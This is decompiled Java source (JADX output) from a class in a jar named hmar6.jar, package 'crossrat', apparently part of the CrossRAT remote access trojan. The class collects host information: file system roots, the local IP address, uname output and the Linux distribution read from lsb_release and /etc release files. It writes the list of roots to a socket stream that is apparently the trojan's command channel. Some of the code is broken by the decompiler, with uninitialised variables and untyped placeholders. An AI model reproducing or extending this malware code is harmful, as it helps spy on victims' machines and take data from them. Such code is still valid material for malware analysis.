package crossrat;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/* loaded from: hmar6.jar:crossrat/e.class */
public class e {

    /* renamed from: a */
    private static String f35a;

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v6, types: [java.io.DataOutputStream] */
    public static void a() {
        File[] listRoots;
        ?? r0 = "";
        String str = r0;
        try {
            for (int i = 0; i < File.listRoots().length; i++) {
                str = String.valueOf(str) + listRoots[i] + k.delimit_within_args;
            }
            r0 = new DataOutputStream(k.k.getOutputStream());
            r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.list_root_dir + k.arg_delimit + str + k.arg_delimit + "&&&");
        } catch (Exception e) {
            r0.printStackTrace();
        }
    }

    public static String b() {
        if (f35a == null) {
            try {
                Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
                while (networkInterfaces.hasMoreElements()) {
                    Enumeration<InetAddress> inetAddresses = networkInterfaces.nextElement().getInetAddresses();
                    while (inetAddresses.hasMoreElements()) {
                        InetAddress nextElement = inetAddresses.nextElement();
                        if (!nextElement.isLoopbackAddress() && nextElement.isSiteLocalAddress() && nextElement.getHostAddress().indexOf(":") < 0) {
                            f35a = nextElement.getHostAddress();
                        }
                    }
                }
                if (f35a == null) {
                    f35a = "127.0.0.1";
                }
            } catch (SocketException unused) {
                f35a = "127.0.0.1";
            }
        }
        return f35a;
    }

    public static List a(String[] strArr) {
        ArrayList arrayList = new ArrayList();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(strArr).getInputStream()));
        while (true) {
            String readLine = bufferedReader.readLine();
            if (readLine == null) {
                bufferedReader.close();
                return arrayList;
            }
            arrayList.add(readLine);
        }
    }

    public static Map a(File file, String str) {
        HashMap hashMap = new HashMap();
        for (String str2 : a(file)) {
            String[] split = str2.split(str);
            hashMap.put(split[0].trim(), split[1].trim());
        }
        return hashMap;
    }

    public static List a(File file) {
        ArrayList arrayList = new ArrayList();
        if (file.exists()) {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
            while (true) {
                String readLine = bufferedReader.readLine();
                if (readLine == null) {
                    break;
                }
                arrayList.add(readLine);
            }
            bufferedReader.close();
        }
        return arrayList;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0 */
    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v7, types: [java.io.BufferedReader] */
    public static String c() {
        ?? r0 = 0;
        String str = null;
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(new String[]{"uname", "-a"}).getInputStream()));
            str = bufferedReader.readLine();
            r0 = bufferedReader;
            r0.close();
        } catch (Exception e) {
            r0.printStackTrace();
        }
        return str;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v0 */
    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v20, types: [java.util.List] */
    public static a.a.b a(boolean z) {
        a.a.b a2;
        ?? r0 = 0;
        List<String> list = null;
        try {
            r0 = a(new File("/var/run/dmesg.boot"));
            list = r0;
        } catch (Exception e) {
            r0.printStackTrace();
        }
        if (list != null) {
            for (String str : list) {
                a.a.b a3 = a.a.b.a(str);
                if (a3 != null) {
                    return a3;
                }
            }
        }
        if (!z || (a2 = a.a.b.a(System.getProperty("os.name"))) == null) {
            return null;
        }
        return a2;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v11 */
    /* JADX WARN: Type inference failed for: r0v147, types: [java.util.Map] */
    /* JADX WARN: Type inference failed for: r0v149, types: [java.util.Map] */
    /* JADX WARN: Type inference failed for: r0v153, types: [int] */
    /* JADX WARN: Type inference failed for: r0v157 */
    /* JADX WARN: Type inference failed for: r0v158 */
    /* JADX WARN: Type inference failed for: r0v159 */
    /* JADX WARN: Type inference failed for: r0v23 */
    /* JADX WARN: Type inference failed for: r0v24, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v29, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r0v32, types: [a.b.d] */
    /* JADX WARN: Type inference failed for: r0v4 */
    /* JADX WARN: Type inference failed for: r0v5, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v6, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v9 */
    public static a.b.d d() {
        Map map;
        boolean z;
        a.b.c[] valuesCustom;
        int i;
        a.b.c cVar = null;
        String str = null;
        String str2 = null;
        boolean z2 = false;
        ?? r0 = 0;
        r0 = 0;
        List list = null;
        try {
            try {
                List a2 = a(new String[]{"lsb_release", "-irc"});
                list = a2;
                r0 = a2.size();
                z2 = r0 == 3;
            } catch (Exception e) {
                r0.printStackTrace();
            }
            map = null;
            r0 = 0;
            boolean z3 = false;
            try {
                r0 = a(new File("/etc/os-release"), "=");
                map = r0;
                r0 = r0;
            } catch (Exception unused) {
                PrintStream printStream = System.out;
                printStream.println("Failed to load /etc/os-release");
                r0 = printStream;
            }
            try {
                r0 = a(new File("/etc/lsb-release"), "=");
                z3 = r0;
                z = z3;
            } catch (Exception unused2) {
                System.out.println("Failed to load /etc/lsb-release");
                z = z3;
            }
        } catch (Exception e2) {
            r0.printStackTrace();
        }
        for (a.b.c cVar2 : a.b.c.valuesCustom()) {
            if (cVar == null && z2) {
                Iterator it = list.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    String[] split = ((String) it.next()).split(":");
                    String trim = split[0].trim();
                    String trim2 = split[1].trim();
                    if (!trim.equals("Distributor ID")) {
                        if (trim.equals("Release")) {
                            str2 = trim2;
                            if (trim2.toLowerCase().contains("kali")) {
                                cVar = a.b.c.KALI;
                                str2 = null;
                                break;
                            }
                        } else if (trim.equals("Codename") && trim2.toLowerCase().contains("debian") && str != null && str.toLowerCase().contains("mint")) {
                            cVar = a.b.c.LMDE;
                            break;
                        }
                        r0.printStackTrace();
                        return new a.b.d(a.b.c.UNKNOWN);
                    }
                    str = trim2;
                }
            }
            if (cVar == null && list == null && map != null) {
                String str3 = (String) map.get("DISTRIB_ID");
                if (str == null && str3 != null) {
                    str = str3.replace("\"", "");
                }
                String str4 = (String) map.get("NAME");
                if (str3 == null && str4 != null) {
                    str = str4.replace("\"", "");
                }
                String str5 = (String) map.get("VERSION_ID");
                if (str5 != null) {
                    str2 = str5.replace("\"", "");
                }
                String str6 = (String) map.get("DISTRIB_RELEASE");
                if (str6 != null) {
                    str2 = str6.replace("\"", "");
                }
                String str7 = (String) map.get("DISTRIB_CODENAME");
                if (str7 != null) {
                    str7.replace("\"", "");
                }
            }
            if (cVar == null) {
                boolean z4 = z ? 1 : 0;
                boolean z5 = z ? 1 : 0;
                if (z4) {
                    String str8 = (String) map.get("DISTRIB_ID");
                    if (str8 != null) {
                        str = str8.replace("\"", "");
                    }
                    String str9 = (String) map.get("DISTRIB_RELEASE");
                    if (str9 != null) {
                        str2 = str9.replace("\"", "");
                    }
                    String str10 = (String) map.get("DISTRIB_CODENAME");
                    if (str10 != null) {
                        str10.replace("\"", "");
                    }
                }
            }
            if (cVar == null) {
                if (cVar2.b().equalsIgnoreCase(str)) {
                    cVar = cVar2;
                }
                if (str != null) {
                    Object[] a3 = cVar2.a();
                    int length = a3.length;
                    int i2 = 0;
                    while (true) {
                        if (i2 >= length) {
                            break;
                        }
                        Object obj = a3[i2];
                        if ((obj instanceof String) && ((String) obj).toLowerCase().contains(str.toLowerCase())) {
                            cVar = cVar2;
                            break;
                        }
                        i2++;
                    }
                }
                Object[] a4 = cVar2.a();
                int length2 = a4.length;
                int i3 = 0;
                while (true) {
                    if (i3 >= length2) {
                        break;
                    }
                    Object obj2 = a4[i3];
                    if ((obj2 instanceof a.b.h) && ((a.b.h) obj2).a() && cVar == null) {
                        cVar = cVar2;
                        break;
                    }
                    i3++;
                }
            }
            r0 = cVar;
            if (r0 == a.b.c.NIXOS) {
                try {
                    r0 = (String) a(new String[]{"nixos-version"}).get(0);
                    str2 = r0;
                } catch (Exception e3) {
                    r0.printStackTrace();
                }
            }
            if (cVar != null) {
                a.b.d dVar = new a.b.d(cVar);
                dVar.a(str2);
                r0 = dVar;
                return r0;
            }
        }
        return new a.b.d(a.b.c.UNKNOWN);
    }
}
